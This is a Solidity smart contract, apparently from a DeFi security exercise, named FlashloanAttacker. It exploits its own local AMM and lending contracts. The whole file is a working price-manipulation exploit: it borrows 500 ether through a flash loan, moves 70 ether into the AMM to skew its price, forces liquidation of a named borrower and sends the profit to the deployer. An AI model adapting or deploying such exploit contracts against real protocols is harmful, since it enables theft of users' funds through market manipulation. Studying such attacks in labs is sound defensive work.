// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Flashloan.sol";
import "./AMM.sol";
import "./Lending.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract FlashloanAttacker is IERC3156FlashBorrower {
    AMM public amm;
    Lending public lending;
    FlashLender public flashLender;
    address borrower;
    address lender;

    struct LoanInfo {
        uint256 collateralBalance;
        uint256 borrowedAmount;
    }

    constructor(address payable _amm, address payable _lending, address payable _flashLender, address _borrower) {
        amm = AMM(_amm);
        lending = Lending(_lending);
        flashLender = FlashLender(_flashLender);
        borrower = _borrower;
        lender = msg.sender;
    }

    function attack() public {
        flashLender.flashLoan(IERC3156FlashBorrower(address(this)), address(amm.lendToken()), 500 ether, "");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        require(IERC20(token).transfer(address(amm), 70 ether), "transfer failed in attack");

        uint256 oldBalance = address(this).balance;
        amm.swapLendTokenForEth(address(this));
        lending.liquidate(borrower);

        uint256 ethAmount = address(this).balance - oldBalance;
        (bool success,) = payable(address(amm)).call{value: ethAmount}("");
        require(success);
        amm.swapEthForLendToken(address(this));

        IERC20(token).transfer(lender, IERC20(token).balanceOf(address(this)) - (amount + fee));

        IERC20(token).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
